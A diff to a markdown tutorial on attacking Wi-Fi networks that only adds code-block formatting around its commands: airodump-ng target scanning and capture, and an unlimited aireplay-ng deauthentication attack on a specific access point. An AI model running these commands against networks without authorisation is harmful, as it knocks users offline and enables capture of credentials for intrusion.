@@ -54,9 +54,10 @@ iwconfig
 
 Use airodump-ng to identify the Access Point (AP) you want to target:
 
-sh
+```sh
 
 sudo airodump-ng wlan0mon
+```
 
 Note down the AP's MAC address and channel. For example:
 
@@ -67,18 +68,18 @@ Note down the AP's MAC address and channel. For example:
 
 Open a new terminal window and start capturing packets:
 
-sh
+```sh
 
 sudo airodump-ng -w hack1 -c 2 --bssid 90:9A:4A:B8:F3:FB wlan0mon
-
+```
 ### Perform Deauthentication Attack
 
 In another terminal window, execute the deauthentication attack:
 
-sh
+```sh
 
 sudo aireplay-ng --deauth 0 -a 90:9A:4A:B8:F3:FB wlan0mon
-
+```
 ### Analyze Captured Packets
 
 Open the captured packets file in Wireshark:
